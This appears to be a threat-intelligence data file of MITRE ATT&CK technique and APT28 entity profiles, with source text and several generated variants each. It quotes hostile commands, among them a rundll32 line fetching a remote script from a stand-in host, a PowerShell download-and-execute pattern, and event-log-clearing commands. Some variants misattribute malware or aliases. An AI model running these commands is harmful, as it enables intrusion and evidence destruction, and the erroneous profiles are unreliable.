Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot)

Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.
431.profile: [profile]Indirect Command Execution, identified as T1202 under the Defense Evasion tactic, primarily targets Windows platforms. This technique involves abusing legitimate utilities to execute commands while bypassing restrictions on command-line interpreters like cmd.exe. Specific methods include using Forfiles, pcalua.exe, Windows Subsystem for Linux components, or Scriptrunner.exe to invoke programs. Additionally, adversaries may abuse ssh.exe by leveraging its ProxyCommand and LocalCommand options via the -o flag or SSH config modifications to run malicious commands, facilitating evasion of security controls.
431.profile_without_enhance: [profile]Remote Command Execution is a technique where adversaries execute arbitrary commands on a remote system, often leveraging legitimate remote services like SSH or RDP for access and command interpreters like cmd or PowerShell for execution. This enables lateral movement and control, typically under the Execution tactic, across Windows, Linux, and macOS platforms.

432.name: file transfer
432.uncertain_mes:
Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMB(Citation: US-CERT TA18-074A), FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.
432.profile: [profile]File Transfer Protocols, identified as T1071.002 under the Command and Control tactic, operates on multiple platforms. Adversaries abuse common application layer protocols like SMB, FTP, FTPS, and TFTP to blend malicious communications with legitimate file transfer traffic. Commands and results are embedded within the protocol's packet fields and headers or concealed within transferred files to evade network detection and filtering. This technique has been associated with groups including SILVERTERRIER, APT41, Dragonfly, and Kimsuky.[/profile]
432.profile_without_enhance: [profile]The entity "file transfer" is a general adversarial action not mapped to a specific MITRE ATT&CK ID. It involves moving files within or into/out of a compromised network. Techniques include using native tools and protocols like SMB, FTP, scp, rsync, curl, and PowerShell commands (e.g., `IEX(New-Object Net.WebClient).downloadString()`), as well as abusing cloud sync services like Dropbox. This activity supports stages such as Ingress Tool Transfer (T1105) and Lateral Tool Transfer (T1570) for tool deployment, command execution, and data exfiltration.

433.name: keylogging
433.uncertain_mes:
Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)

Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:

* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.
* Reading raw keystroke data from the hardware buffer.
* Windows Registry modifications.
* Custom drivers.
* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)
433.profile: [profile]Keylogging (T1056.001) is a Credential Access technique used primarily on Windows, Linux, and macOS platforms. It works by intercepting user keystrokes through methods like hooking API callbacks for keystroke processing, reading raw data from the hardware buffer, modifying the Windows Registry, or deploying custom drivers. Adversaries may use it to capture credentials over time, often clearing browser cookies to force re-authentication and accelerate collection. It is associated with threat groups including OilRig and malware like X-Agent.[/profile]
433.profile_without_enhance: [profile]Keylogging, identified as MITRE ATT&CK technique T1056.001 under the Credential Access tactic, primarily targets Windows platforms. It works by intercepting user keystrokes to capture credentials, often used when OS credential dumping fails. Specific technical methods include hooking API callbacks for keystroke processing, reading raw data from the hardware buffer, modifying the Windows Registry, deploying custom drivers, and leveraging Modify System Image (T1601) on network devices. This technique is employed by numerous threat groups including APT28, Lazarus Group, and Kimsuky.

434.name: rundll32
434.uncertain_mes: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}). Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")" This behavior has been seen used by malware such as Poweliks.(Citation: This is Security Command Line Confusion) Threat actors may also abuse legitimate, signed system DLLs (e.g., zipfldr.dll, ieframe.dll) with rundll32.exe to execute malicious programs or scripts indirectly, making their activity appear more legitimate and evading detection.(Citation: lolbas project Zipfldr.dll)(Citation: lolbas project Ieframe.dll) Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1). Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion)
434.profile: [profile]This entity is the MITRE ATT&CK technique T1218.011, named Rundll32, under the Defense Evasion tactic for Windows platforms. It involves abusing the legitimate rundll32.exe utility to proxy execution of malicious code, evading security tools that may whitelist or not monitor this process. Technical mechanics include executing DLL payloads via commands like `rundll32.exe {DLLname, DLLfunction}`, running Control Panel Item files (.cpl) using functions like `Control_RunDLL`, and executing scripts such as JavaScript with specific syntax. Adversaries further obscure execution by leveraging the order in which rundll32 loads function names (checking for W/A suffixes first) or using ordinal numbers, and by abusing signed system DLLs like zipfldr.dll to appear legitimate.
434.profile_without_enhance: [profile]Rundll32 is MITRE ATT&CK technique T1218.011, a Defense Evasion and Execution tactic for Windows. It abuses the legitimate rundll32.exe binary to proxy execution of malicious code, evading security tools via allowlists. Technical mechanics include executing DLL payloads with commands like `rundll32.exe {DLLname, DLLfunction}`, running Control Panel (.cpl) files via `Control_RunDLL`, and executing JavaScript scripts. Adversaries further obscure activity by leveraging Unicode/ANSI function loading order (e.g., `ExampleFunctionW`/`A`) and using signed system DLLs like zipfldr.dll.

435.name: NAT-ed environment
435.profile: [profile]The entity "NAT-ed environment" is referenced in the context of MITRE ATT&CK technique T1599.001, Network Address Translation Traversal, under the tactic Defense Evasion. This technique involves adversaries modifying a network device's NAT configuration to bridge separated network boundaries, allowing them to bypass routing restrictions and obscure their activities by rewriting IP packet headers when traversing border devices like routers or firewalls. It is associated with malware such as X-Tunnel.
435.profile_without_enhance: [profile]The entity "NAT-ed environment" is not a standard MITRE ATT&CK technique. Based on the retrieved context, it relates to the technique "Network Address Translation Traversal" (T1599.001), a tactic of Defense Evasion. This technique involves an adversary who has gained control of a network boundary device, such as a router or firewall, and maliciously modifies its NAT configuration. This modification can allow the adversary to bypass normal traffic routing restrictions, enabling them to send traffic between separated networks (like trusted and untrusted zones) that would normally be isolated, or to obscure their activities by rewriting packet addresses to make monitoring more difficult for defenders.

436.name: remcom
436.uncertain_mes:
Member-only story
Second Zerologon attacker seen exploiting internet honeypot
About three weeks I detected an attacker exploiting Zerologon on my personal honeypot:
There is more activity today, which shows proof of attackers using Zerologon for remote code execution on random internet endpoints.
At 11:01UTC, IP address 124.70.137.246 arrived in BluePot and tried exploiting Zerologon.
436.profile: [profile]RemCom is a lateral movement utility tool, also known as a reimplementation of PsExec. It is written in C/C++ and is used to create an interactive command prompt on a remote system, execute files and shell commands, and copy files. It has been associated with or utilized by the intrusion set Fancy Bear. Its key technical behavior is enabling remote command execution, and it is designed for the Windows platform, often employed in post-exploitation for lateral movement within a network.[profile]
436.profile_without_enhance: [profile]Remcom is a lateral movement utility, also known as Psexec, which is a legitimate Windows administration tool repurposed by threat actors. It is used by groups including Wizard Spider (associated with Conti), FIN6 (associated with Lockergoga), APT29, and APT41, often within tools like Cobalt Strike. Its key technique involves creating and starting a remote service to execute commands, facilitating lateral movement. It is written in C/C++ to reimplement PsExec logic, supports creating interactive command prompts, executing files/commands, and copying files to remote systems, and is primarily targeted at Windows platforms.

437.name: psexec
437.profile: [profile]Psexec is a legitimate Windows administration tool (Sysinternals PsExec) that is widely abused as a lateral movement utility, with the alias Remcom. It is frequently leveraged by threat groups like Wizard Spider (Conti ransomware), APT29, APT32, APT41, FIN6, and FIN7, among others. Its key malicious behavior involves remote execution via the creation and start of a service on a target system, often using commands like `remote-exec psexec` or `jump psexec` for lateral movement. It primarily targets Windows environments and is commonly integrated into frameworks like Cobalt Strike and ransomware operations such as Lockergoga for distributed command execution.
437.profile_without_enhance: [profile]PsExec is a legitimate Windows administrative tool from Sysinternals, but it is widely repurposed as a lateral movement utility by threat actors. Its primary alias is RemCom, a reimplementation of PsExec. It is associated with numerous groups, including Fancy Bear, APT 29, Wizard Spider (linked to Conti), and FIN6. Its key behavior is remote execution, where it creates and starts a service on a target Windows system to execute commands or files, a technique leveraged by tools like Cobalt Strike. The target platform is exclusively Windows, and it is commonly used in attack chains for exploitation and lateral movement.

439.name: Clearing event logs
439.uncertain_mes: Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. With administrator privileges, the event logs can be cleared with the following utility commands: * wevtutil cl system * wevtutil cl application * wevtutil cl security These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command Remove-EventLog -LogName Security to delete the Security EventLog and after reboot, disable future logging. Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging) Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.
439.profile: [profile]Clear Windows Event Logs, identified as T1070.001 under the Defense Evasion tactic, targets the Windows platform. Adversaries with administrator privileges execute commands like `wevtutil cl system`, `wevtutil cl application`, and `wevtutil cl security` to erase the System, Application, and Security logs. They may also use PowerShell commands such as `Remove-EventLog -LogName Security` or directly delete log files from `C:\Windows\System32\winevt\logs\` to remove forensic evidence of intrusion activities.
439.profile_without_enhance: [profile]The entity "Clearing event logs" aligns with the MITRE ATT&CK technique "Clear Windows Event Logs" (T1070.001) under the Defense Evasion tactic for Windows platforms. This technique involves adversaries deleting Windows Event Logs, such as System, Application, and Security logs, to remove evidence of intrusion. Specific technical mechanics include using the `wevtutil` command-line utility (e.g., `wevtutil cl system`), PowerShell commands like `Remove-EventLog`, the Event Viewer GUI, or directly deleting log files from `C:\Windows\System32\winevt\logs\`, typically requiring administrator privileges.

440.name: Resetting file timestamps
440.profile: [profile]Resetting file timestamps, also known as timestomping, is a defense evasion technique (T1070.006) used by adversaries to modify file timestamps (modify, access, create, and change times) to hide new or altered files by making them blend with legitimate files in the same directory. On Windows, this involves altering the $STANDARD_INFORMATION attribute via user-level API calls, and sometimes the $FILE_NAME attribute via kernel interaction for "double timestomping." On Linux and ESXi, commands like `touch -a -m -t` are used. It is often paired with file masquerading and has been used by groups like APT38, Lazarus Group, and Mustang Panda.
440.profile_without_enhance: [profile]Resetting file timestamps, also known as Timestomping, is a Defense Evasion technique (T1070.006) used by adversaries to hide malicious file activity on Windows, Linux, and ESXi systems. The technique modifies file timestampsâ€”such as modify, access, create, and change timesâ€”to match those of legitimate files in the same directory, thereby evading forensic detection. On Windows, this involves altering the `$STANDARD_INFORMATION` attribute via API calls, and sometimes the `$FILE_NAME` attribute for deeper concealment. In Linux, commands like `touch -a -m -t <timestamp> <filename>` are used to set specific access and modification times, making malicious files blend in with normal system files.

441.name: Intelligence gathering
441.uncertain_mes:
Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks, including conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043), creating basic scripts, assisting social engineering, and even developing payloads.(Citation: MSFT-AI) 

For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in [Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing for Information](https://attack.mitre.org/techniques/T1598) campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting [Develop Capabilities](https://attack.mitre.org/techniques/T1587). AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)) malicious scripts and payloads.(Citation: OpenAI-CTI) Finally, AI-generated text, images, audio, and video may be used for fraud, [Impersonation](https://attack.mitre.org/techniques/T1656), and other malicious activities.(Citation: Google-Vishing24)(Citation: IC3-AI24)(Citation: WSJ-Vishing-AI24)
441.profile: [profile]Artificial Intelligence, designated as T1588.007 within the Resource Development tactic, involves adversaries obtaining access to generative AI tools like LLMs to automate and enhance malicious tasks. These tools are used to draft multilingual phishing content, conduct vulnerability research to support capability development, and generate or refine malicious scripts and payloads, including for obfuscation. AI-generated media also facilitates impersonation and fraud activities.
441.profile_without_enhance: [profile]Intelligence gathering is a broad reconnaissance tactic, not a specific MITRE ATT&CK technique. The retrieved information describes related techniques such as T1597 (Search Closed Sources) and T1681 (Search Threat Vendor Data), where adversaries gather information from private databases, threat intelligence feeds, or dark web sources to inform targeting, develop capabilities, or monitor reports about their own campaigns to adapt their operations.

445.name: Sofacy
445.uncertain_mes:
[APT28](https://attack.mitre.org/groups/G0007) is a threat group that has been attributed to Russia's General Staff Main Intelligence Directorate (GRU) 85th Main Special Service Center (GTsSS) military unit 26165.(Citation: NSA/FBI Drovorub August 2020)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) This group has been active since at least 2004.(Citation: DOJ GRU Indictment Jul 2018)(Citation: Ars Technica GRU indictment Jul 2018)(Citation: Crowdstrike DNC June 2016)(Citation: FireEye APT28)(Citation: SecureWorks TG-4127)(Citation: FireEye APT28 January 2017)(Citation: GRIZZLY STEPPE JAR)(Citation: Sofacy DealersChoice)(Citation: Palo Alto Sofacy 06-2018)(Citation: Symantec APT28 Oct 2018)(Citation: ESET Zebrocy May 2019)

[APT28](https://attack.mitre.org/groups/G0007) reportedly compromised the Hillary Clinton campaign, the Democratic National Committee, and the Democratic Congressional Campaign Committee in 2016 in an attempt to interfere with the U.S. presidential election.(Citation: Crowdstrike DNC June 2016) In 2018, the US indicted five GRU Unit 26165 officers associated with [APT28](https://attack.mitre.org/groups/G0007) for cyber operations (including close-access operations) conducted between 2014 and 2018 against the World Anti-Doping Agency (WADA), the US Anti-Doping Agency, a US nuclear facility, the Organization for the Prohibition of Chemical Weapons (OPCW), the Spiez Swiss Chemicals Laboratory, and other organizations.(Citation: US District Court Indictment GRU Oct 2018) Some of these were conducted with the assistance of GRU Unit 74455, which is also referred to as [Sandworm Team](https://attack.mitre.org/groups/G0034).
445.profile: [profile]Sofacy, also known as APT28, Fancy Bear, Sednit, and Pawn Storm, is a threat group attributed to Russia's GRU Unit 26165, active since at least 2004. Its arsenal includes custom malware like Zebrocy and tools such as DealersChoice and Sofacy Carberp variants. The group is known for spear-phishing and close-access operations, often targeting government, political, and defense sectors in the US and Europe, including the 2016 US election interference and attacks on organizations like WADA, primarily motivated by espionage and geopolitical influence.
445.profile_without_enhance: [profile]The intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, STRONTIUM, Pawn Storm, and Tsar Team. Its key custom malware includes the modular X-Agent (CHOPSTICK) and X-Tunnel backdoors, SedUploader, Zebrocy, and the Carberp-based reconnaissance tool JhuHugit. Key TTPs involve sophisticated spear-phishing via documents and exploitation of zero-day vulnerabilities in software like Adobe Flash and Java. The group is attributed to Russia's GRU military intelligence, specifically Unit 26165. It primarily targets government, military, diplomatic, media, and political organizations in NATO countries, Europe, and North America, motivated by strategic cyber espionage and information operations aligned with Russian state interests.[/profile]
445.profile_without_enhance_0: [profile]Sofacy is a primary alias for the APT group more commonly standardized as APT28 (also known as Fancy Bear, Sednit, Strontium, Tsar Team, and Pawn Storm). The group is attributed to Russia's military intelligence agency, the GRU. Its key malware includes the Sofacy Carberp variant and the DealersChoice framework. APT28 is known for sophisticated spear-phishing campaigns and zero-day exploits, primarily targeting government, military, and political organizations in Europe and North America to conduct espionage and information operations aligned with Russian state interests.
445.profile_without_enhance_0_no_hsage: [profile]The intrusion set Sofacy is widely recognized as APT28 (also known as Fancy Bear, Sednit, Pawn Storm, and STRONTIUM). It is attributed to Russia's GRU military intelligence. The group employs custom malware such as Sofacy Carberp and DealersChoice, and its operations frequently target government, military, and political organizations, particularly in Europe and North America, with motivations centered on espionage and information operations.
445.profile_without_enhance_20: [profile]The intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, Strontium, Pawn Storm, and Tsar Team. Its key custom malware includes the modular X-Agent (CHOPSTICK) backdoor, X-Tunnel, Zebrocy, and variants like Sofacy Carberp, JhuHugit, AdvStoreShell (AZZY/NetUI/EvilToss), and CoreShell. Key TTPs involve sophisticated spear-phishing, exploitation of zero-day vulnerabilities (e.g., CVE-2015-2590 in Java, Flash zero-days), credential harvesting, and the use of tools like USB stealers for data exfiltration. The group is attributed to Russia's GRU military intelligence, specifically Unit 26165. It primarily targets government, military, diplomatic, and political sectors in NATO countries, Europe, and North America, motivated by strategic cyber espionage and information operations aligned with Russian state interests.[/profile]
445.profile_without_enhance_20_no_hsage: [profile]The intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, Strontium, Pawn Storm, and Tsar Team. Its key custom malware includes the modular X-Agent (also known as CHOPSTICK or SPLM), X-Tunnel, Zebrocy, and a multi-generational toolset comprising implants like Azzy (AdvStoreShell/EvilToss/NetUI), Coreshell (SOURFACE), and Gamefish. Key TTPs involve sophisticated spear-phishing for initial access, exploitation of zero-day vulnerabilities (e.g., in Java and Flash), and credential harvesting for lateral movement. The group is attributed to Russia's GRU military intelligence, specifically Unit 26165. It primarily targets government, military, diplomatic, and political sectors in NATO countries, Europe, and North America, with additional campaigns observed in the Middle East and Central Asia, motivated by strategic cyber espionage and information operations aligned with Russian state interests.[/profile]
445.profile_without_enhance_15_no_hsage: [profile]This intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, Strontium, Pawn Storm, and Tsar Team. Its key custom malware includes the modular X-Agent (CHOPSTICK) backdoor, X-Tunnel, SedUploader, Zebrocy, and the Sofacy Carberp variant, with notable use of the UEFI rootkit LoJax and multi-generational backdoors like Azzy/EvilToss/NetUI. Key TTPs involve sophisticated spear-phishing for credential harvesting, exploitation of zero-day vulnerabilities, and the use of tools like WinRAR for data exfiltration. The group is attributed to Russia's GRU military intelligence, specifically units like 26165. It primarily targets government, military, diplomatic, and political organizations in NATO countries, Europe, and North America, motivated by cyber espionage and information operations aligned with Russian strategic interests.[/profile]
445.profile_without_enhance_15: [profile]The intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, Strontium, Pawn Storm, Tsar Team, and Threat Group-4127. Its key custom malware includes the modular X-Agent (CHOPSTICK) backdoor, X-Tunnel, SedUploader, Zebrocy, AdvStoreShell (AZZY), and the UEFI rootkit LoJax. Key TTPs involve sophisticated spear-phishing for credential harvesting, exploitation of zero-day vulnerabilities in software like Adobe Flash and Java, and the use of tools like WinRAR for data exfiltration. The group is attributed to Russia's GRU military intelligence, specifically Unit 26165. It primarily targets government, military, diplomatic, and political organizations in NATO countries, Europe, and North America, motivated by strategic cyber espionage and information operations aligned with Russian state interests.[/profile]
445.profile_without_enhance_10_no_hsage: [profile]The intrusion set is definitively identified as APT28, also known as Sofacy, Fancy Bear, Sednit, Strontium, Pawn Storm, and Tsar Team. Its key custom malware includes the modular X-Agent (CHOPSTICK) backdoor, Zebrocy, Seduploader, and variants within the "Duke" malware family such as CosmicDuke and MiniDuke. Key TTPs involve sophisticated spear-phishing for credential harvesting, exploitation of zero-day vulnerabilities in software like Microsoft Office and Adobe Flash, and the use of custom command and control protocols like TLV1. The group is attributed to Russia's GRU military intelligence, specifically Units 26165 and 74455. It primarily targets government, military, political, diplomatic, and NGO sectors in NATO countries, Europe, Ukraine, and North America, with motivations centered on state-sponsored cyber espionage and information operations.[/profile]
